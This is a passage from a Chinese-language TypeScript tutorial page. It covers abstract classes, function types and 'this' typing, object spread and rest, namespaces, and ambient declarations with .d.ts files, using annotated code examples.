&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Department name: &quot;</span> + <span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">abstract</span> <span class="title function_">printMeeting</span>(): <span class="built_in">void</span>; <span class="comment">// 必须在派生类中实现</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AccountingDepartment</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Department</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(<span class="string">&quot;Accounting and Auditing&quot;</span>); <span class="comment">// 在派生类的构造函数中必须调用 super()</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">printMeeting</span>(): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The Accounting Department meets each Monday at 10am.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">generateReports</span>(): <span class="built_in">void</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Generating accounting reports...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> <span class="attr">department</span>: <span class="title class_">Department</span>; <span class="comment">// 允许创建一个对抽象类型的引用</span></span><br><span class="line">department = <span class="keyword">new</span> <span class="title class_">Department</span>(); <span class="comment">// 错误: 不能创建一个抽象类的实例</span></span><br><span class="line">department = <span class="keyword">new</span> <span class="title class_">AccountingDepartment</span>(); <span class="comment">// 允许对一个抽象子类进行实例化和赋值</span></span><br><span class="line">department.<span class="title function_">printName</span>();</span><br><span class="line">department.<span class="title function_">printMeeting</span>();</span><br><span class="line">department.<span class="title function_">generateReports</span>(); <span class="comment">// 错误: 方法在声明的抽象类中不存在</span></span><br></pre></td></tr></table></figure>

<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数的完整类型</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="attr">myAdd</span>: <span class="function">(<span class="params">x:<span class="built_in">number</span>, y？:<span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">number</span> =</span><br><span class="line">    <span class="keyword">function</span>(<span class="params">x: <span class="built_in">number</span>, y: <span class="built_in">number</span></span>): <span class="built_in">number</span> &#123; <span class="keyword">return</span> x + y; &#125;;</span><br><span class="line"><span class="comment">// 剩余参数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">buildName</span>(<span class="params">firstName: <span class="built_in">string</span>, ...restOfName: <span class="built_in">string</span>[]</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> firstName + <span class="string">&quot; &quot;</span> + restOfName.<span class="title function_">join</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> employeeName = <span class="title function_">buildName</span>(<span class="string">&quot;Joseph&quot;</span>, <span class="string">&quot;Samuel&quot;</span>, <span class="string">&quot;Lucas&quot;</span>, <span class="string">&quot;MacKinzie&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>只要参数类型是匹配的，那么就认为它是有效的函数类型，而不在乎参数名是否正确，参数名旁使用<code>?</code>实现可选参数。lastName = “Smith”   把 last name 的默认值设置为<code>&quot;Smith&quot;</code>。<br>在函数和返回值类型之前使用(<code>=&gt;</code>)符号，使之清晰明了。如果函数没有返回任何值，也必须指定返回值类型为<code>void</code>而不能留空。<br>在参数名旁使用 ? 实现可选参数的功能</p>
<h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><h4 id="匿名函数-this"><a href="#匿名函数-this" class="headerlink" title="匿名函数 this"></a>匿名函数 this</h4><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Card</span> &#123;</span><br><span class="line">  <span class="attr">suit</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">card</span>: <span class="built_in">number</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Deck</span> &#123;</span><br><span class="line">  <span class="attr">suits</span>: <span class="built_in">string</span>[];</span><br><span class="line">  <span class="attr">cards</span>: <span class="built_in">number</span>[];</span><br><span class="line">  <span class="title function_">createCardPicker</span>(<span class="attr">this</span>: <span class="title class_">Deck</span>): <span class="function">() =&gt;</span> <span class="title class_">Card</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> <span class="attr">deck</span>: <span class="title class_">Deck</span> = &#123;</span><br><span class="line">  <span class="attr">suits</span>: [<span class="string">&quot;hearts&quot;</span>, <span class="string">&quot;spades&quot;</span>, <span class="string">&quot;clubs&quot;</span>, <span class="string">&quot;diamonds&quot;</span>],</span><br><span class="line">  <span class="attr">cards</span>: <span class="title class_">Array</span>(<span class="number">52</span>),</span><br><span class="line">  <span class="comment">// <span class="doctag">NOTE:</span> The function now explicitly specifies that its callee must be of type Deck</span></span><br><span class="line">  <span class="attr">createCardPicker</span>: <span class="keyword">function</span> (<span class="params"><span class="variable language_">this</span>: Deck</span>) &#123;</span><br><span class="line">    <span class="comment">//不指定this为any</span></span><br><span class="line">    <span class="keyword">return</span> <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="comment">//箭头函数能保存函数创建时的`this`值，而不是调用时的值。这里是Deck；如果是function()&#123; this 往往报错，为window或undefined</span></span><br><span class="line">      <span class="keyword">let</span> pickedCard = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">52</span>);</span><br><span class="line">      <span class="keyword">let</span> pickedSuit = <span class="title class_">Math</span>.<span class="title function_">floor</span>(pickedCard / <span class="number">13</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> &#123; <span class="attr">suit</span>: <span class="variable language_">this</span>.<span class="property">suits</span>[pickedSuit], <span class="attr">card</span>: pickedCard % <span class="number">13</span> &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="回调函数-this"><a href="#回调函数-this" class="headerlink" title="回调函数 this"></a>回调函数 this</h4><p>当你将一个函数传递到某个库函数里在稍后被调用时，你可能也见到过回调函数里的<code>this</code>会报错。 因为当回调函数被调用时，它会被当成一个普通函数调用，<code>this</code>将为<code>undefined</code>。 稍做改动，你就可以通过<code>this</code>参数来避免错误。 首先，库函数的作者要指定<code>this</code>的类型：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">UIElement</span> &#123;</span><br><span class="line">  <span class="title function_">addClickListener</span>(<span class="attr">onclick</span>: <span class="function">(<span class="params"><span class="variable language_">this</span>: <span class="built_in">void</span>, e: Event</span>) =&gt;</span> <span class="built_in">void</span>): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>this: void</code>意味着<code>addClickListener</code>期望<code>onclick</code>是一个函数且它不需要一个<code>this</code>类型。 然后，为调用代码里的<code>this</code>添加类型注解：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Handler</span> &#123;</span><br><span class="line">  <span class="attr">info</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="title function_">onClickBad</span>(<span class="params"><span class="variable language_">this</span>: Handler, e: Event</span>) &#123;</span><br><span class="line">    <span class="comment">// oops, used this here. using this callback would crash at runtime</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">info</span> = e.<span class="property">message</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> h = <span class="keyword">new</span> <span class="title class_">Handler</span>();</span><br><span class="line">uiElement.<span class="title function_">addClickListener</span>(h.<span class="property">onClickBad</span>); <span class="comment">// error!</span></span><br></pre></td></tr></table></figure>

<p>指定了<code>this</code>类型后，你显式声明<code>onClickBad</code>必须在<code>Handler</code>的实例上调用。 然后 TypeScript 会检测到<code>addClickListener</code>要求函数带有<code>this: void</code>。 改变<code>this</code>类型来修复这个错误：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Handler</span> &#123;</span><br><span class="line">  <span class="attr">info</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="title function_">onClickGood</span>(<span class="params"><span class="variable language_">this</span>: <span class="built_in">void</span>, e: Event</span>) &#123;</span><br><span class="line">    <span class="comment">// can&#x27;t use this here because it&#x27;s of type void!</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;clicked!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> h = <span class="keyword">new</span> <span class="title class_">Handler</span>();</span><br><span class="line">uiElement.<span class="title function_">addClickListener</span>(h.<span class="property">onClickGood</span>);</span><br></pre></td></tr></table></figure>

<p>因为<code>onClickGood</code>指定了<code>this</code>类型为<code>void</code>，因此传递<code>addClickListener</code>是合法的。 当然了，这也意味着不能使用<code>this.info</code>. 如果你两者都想要，你不得不使用箭头函数了：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Handler</span> &#123;</span><br><span class="line">  <span class="attr">info</span>: <span class="built_in">string</span>;</span><br><span class="line">  onClickGood = <span class="function">(<span class="params">e: Event</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">info</span> = e.<span class="property">message</span>;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是可行的因为箭头函数使用外层的<code>this</code>，所以你总是可以把它们传给期望<code>this: void</code>的函数。 缺点是每个<code>Handler</code>对象都会创建一个箭头函数。 另一方面，方法只会被创建一次，添加到<code>Handler</code>的原型链上。 它们在不同<code>Handler</code>对象间是共享的。</p>
<h3 id="重载"><a href="#重载" class="headerlink" title="重载"></a>重载</h3><p>同一个函数提供多个函数类型定义来进行函数重载</p>
<h2 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h2><h3 id="对象的展开与剩余运算符"><a href="#对象的展开与剩余运算符" class="headerlink" title="对象的展开与剩余运算符"></a>对象的展开与剩余运算符</h3><p>TypeScript 2.1 带来了对 <a href="https://link.zhihu.com/?target=https://github.com/sebmarkbage/ecmascript-rest-spread">ES2017 展开与剩余运算符</a>的支持.<br>和数组的展开类似, 展开一个对象可以很方便地获得它的浅拷贝:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> copy = &#123; ...original &#125;;</span><br></pre></td></tr></table></figure>

<p>相似的, 你可以合并多个不同的对象. 在下面的例子中, merged 会有来自 foo, bar 和 baz 的属性.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> merged = &#123; ...foo, ...bar, ...baz &#125;;</span><br></pre></td></tr></table></figure>

<p>你也可以覆盖已有的属性和添加新的属性:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="string">&quot;string&quot;</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> newObj = &#123; ...obj, <span class="attr">z</span>: <span class="number">3</span>, <span class="attr">y</span>: <span class="number">4</span> &#125;; <span class="comment">// &#123; x: number, y: number, z: number &#125;</span></span><br></pre></td></tr></table></figure>

<p>指定展开操作的顺序决定了那些属性的值会留在创建的对象里; 在靠后的展开中出现的属性会 “战胜” 之前创建的属性.</p>
<p>对象的剩余操作和对象的展开是对应的, 这样一来我们可以导出解构一个元素时被漏掉的其他属性.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123; <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">1</span>, <span class="attr">z</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; z, ...obj1 &#125; = obj;</span><br><span class="line">obj1; <span class="comment">// &#123;x: number, y: number&#125;;</span></span><br></pre></td></tr></table></figure>

<h2 id="命名空间（namespace）"><a href="#命名空间（namespace）" class="headerlink" title="命名空间（namespace）"></a>命名空间（namespace）</h2><p>避免在全局中，不同类型跟其他类型产生命名冲突，可以用不同的命名空间进行分隔。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义命名空间 ns</span></span><br><span class="line"><span class="keyword">namespace</span> ns &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">let</span> a = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">  <span class="keyword">let</span> b = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 正确，可以访问b，因为函数show和变量b在同一个命名空间之内</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确，a被export，可以在ns之外访问</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">c</span>: <span class="built_in">string</span> = ns.<span class="property">a</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误，b不允许在ns之外访问</span></span><br><span class="line"><span class="comment">// error TS2339: Property &#x27;b&#x27; does not exist on type &#x27;typeof ns&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">d</span>: <span class="built_in">number</span> = ns.<span class="property">b</span>;</span><br></pre></td></tr></table></figure>

<h3 id="多文件"><a href="#多文件" class="headerlink" title="多文件"></a>多文件</h3><p>当应用变得越来越大时，我们需要将代码分离到不同的文件中以便于维护。同一个命名空间的代码，尽管处于不同文件，使用的时候像一个文件一样。<br>​</p>
<h3 id="别名"><a href="#别名" class="headerlink" title="别名"></a>别名</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">Shapes</span> &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">namespace</span> <span class="title class_">Polygons</span> &#123;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Triangle</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">export</span> <span class="keyword">class</span> <span class="title class_">Square</span> &#123;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> polygons = <span class="title class_">Shapes</span>.<span class="property">Polygons</span>;</span><br><span class="line"><span class="keyword">let</span> sq = <span class="keyword">new</span> polygons.<span class="title class_">Square</span>(); <span class="comment">// Same as &quot;new Shapes.Polygons.Square()&quot;</span></span><br></pre></td></tr></table></figure>

<p>​</p>
<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>声明的本质是告知编译器一个标识符的类型信息<br>声明在 TypeScript 中至关重要，只有通过声明才能告知编译器一个随机出现的标识符到底代表什么含义。对于语言关键字之外的任意标识符，如果编译器无法获取它的声明，将会报错</p>
<h3 id="内部声明"><a href="#内部声明" class="headerlink" title="内部声明"></a>内部声明</h3><p>到目前为止，所有在 TypeScript 源码中出现的声明，都是内部声明，内部声明主要是你当前所写的代码中的所有变量和类型的声明 ​</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明a为一个数字</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">a</span>: <span class="built_in">number</span>;</span><br><span class="line"><span class="comment">// 声明b为一个数字并初始化为2</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">b</span>: <span class="built_in">number</span> = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明T为一个接口</span></span><br><span class="line"><span class="keyword">interface</span> T &#123;&#125;</span><br><span class="line"><span class="comment">// 声明接口类型变量b</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">b</span>: T;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明fn为一个函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明myFunc为一个函数</span></span><br><span class="line"><span class="comment">// 此处利用了类型推导</span></span><br><span class="line"><span class="keyword">let</span> myFunc = <span class="keyword">function</span> (<span class="params">a: <span class="built_in">number</span></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明MyEnum枚举类型</span></span><br><span class="line"><span class="built_in">enum</span> <span class="title class_">MyEnum</span> &#123;</span><br><span class="line">  A,</span><br><span class="line">  B,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明NS为命名空间</span></span><br><span class="line"><span class="keyword">namespace</span> NS &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h3 id="外部声明"><a href="#外部声明" class="headerlink" title="外部声明"></a>外部声明</h3><p>外部声明一般针对第三方来历不明的库，当你想要在你的 typescript 项目中使用用 javascript 代码写的第三方库时，就需要用到外部声明。一个常见的例子，假设我们在 HTML 中通过 script 标签引入了全局 jQuery:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 注册全局变量 $</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;path/to/jquery.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>声明应该是纯粹对于一个标识符类型或外观的描述，便于编译器识别，外部声明具有以下特点:</p>
<ul>
<li>必须使用 declare 修饰外部声明</li>
<li>不能包含实现或初始化信息（内部声明可以在声明的时候包含实现或初始化）</li>
</ul>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明a为一个数字</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">let</span> <span class="attr">a</span>: <span class="built_in">number</span>;</span><br><span class="line"><span class="comment">// 错误，外部声明不能初始化</span></span><br><span class="line"><span class="comment">// error TS1039: Initializers are not allowed in ambient contexts</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">let</span> <span class="attr">b</span>: <span class="built_in">number</span> = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明T为一个接口</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">interface</span> T &#123;&#125;</span><br><span class="line"><span class="comment">// 声明接口类型变量b</span></span><br><span class="line"><span class="keyword">let</span> <span class="attr">b</span>: T;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明fn为一个函数</span></span><br><span class="line"><span class="comment">// 错误，声明包含了函数实现</span></span><br><span class="line"><span class="comment">// error TS1183: An implementation cannot be declared in ambient contexts</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 正确，不包含函数体实现</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">function</span> <span class="title function_">fn</span>(<span class="params"></span>): <span class="built_in">void</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明myFunc为一个函数</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">let</span> <span class="attr">myFunc</span>: <span class="function">(<span class="params">a: <span class="built_in">number</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明MyEnum枚举类型</span></span><br><span class="line"><span class="keyword">declare</span> <span class="built_in">enum</span> <span class="title class_">MyEnum</span> &#123;</span><br><span class="line">  A,</span><br><span class="line">  B,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明NS为命名空间</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">namespace</span> NS &#123;</span><br><span class="line">  <span class="comment">// 错误，声明不能初始化</span></span><br><span class="line">  <span class="comment">// error TS1039: Initializers are not allowed in ambient contexts</span></span><br><span class="line">  <span class="keyword">const</span> <span class="attr">a</span>: <span class="built_in">number</span> = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">// 正确，仅包含声明</span></span><br><span class="line">  <span class="keyword">const</span> <span class="attr">b</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="comment">// 正确，函数未包含函数体实现</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">c</span>(<span class="params"></span>): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明一个类</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">class</span> <span class="title class_">Greeter</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">greeting: <span class="built_in">string</span></span>);</span><br><span class="line">  <span class="attr">greeting</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="title function_">showGreeting</span>(): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>外部声明还可以用于声明一个模块，如果一个外部模块的成员要被外部访问，模块成员应该用 export 声明导出：</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> <span class="variable language_">module</span> <span class="string">&quot;io&quot;</span> &#123;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">file: <span class="built_in">string</span></span>): <span class="built_in">string</span>;</span><br><span class="line">  <span class="keyword">export</span> <span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">file: <span class="built_in">string</span>, data: <span class="built_in">string</span></span>): <span class="built_in">void</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>习惯上，常常把外部声明写在一个后缀名为 .d.ts 的声明文件中，然后用三斜线指令引入进来</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// jquery.d.ts 文件</span></span><br><span class="line"><span class="keyword">declare</span> <span class="keyword">let</span> <span class="attr">$</span>: <span class="function">(<span class="params">selector: <span class="built_in">string</span></span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="attr">html</span>: <span class="function">(<span class="params">content: <span class="built_in">string</span></span>) =&gt;</span> <span class="built_in">void</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.ts 文件</span></span><br><span class="line"><span class="comment">/// &lt;reference path=&quot;./jquery.d.ts&quot; /&gt;</span></span><br><span class="line">$(<span class="string">&quot;body&quot;</span>).<span class="title function_">html</span>(<span class="string">&quot;hello world&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="d-ts"><a href="#d-ts" class="headerlink" title=".d.ts"></a>.d.ts</h3><p>d.ts”文件用于为 TypeScript 提供有关用 JavaScript 编写的 API 的类型信息。主流的库都是 JS 编写的，并不支持类型系统，需要编写仅包含类型注释的 d.ts 文件，就可以在 TS 文件中使用现有 JS 库。<br>在 Typescript 2.0 之后，TypeScript 将会默认的查看 ./node_modules/@types 文件夹里的.d.ts 文件，自动从这里来获取模块的类型定义。<br>默认情况下，所有的 @types 包都会在编译时应用，任意层的 node_modules/@types 都会被使用，进一步说，在   ./node_modules/@types/ , ../node_modules/@types/, ../../node_modules/@types/ 都被应用。如果你的类型定义不在这个文件夹中，可以使用 typesRoot 来配置，只有在 typeRoots 中的包才会被包含。</p>
<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   <span class="string">&quot;compilerOptions&quot;</span>: &#123;</span><br><span class="line">       <span class="string">&quot;typeRoots&quot;</span> : [<span class="string">&quot;./typings&quot;</span>]</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​</p>
<p>​</p>
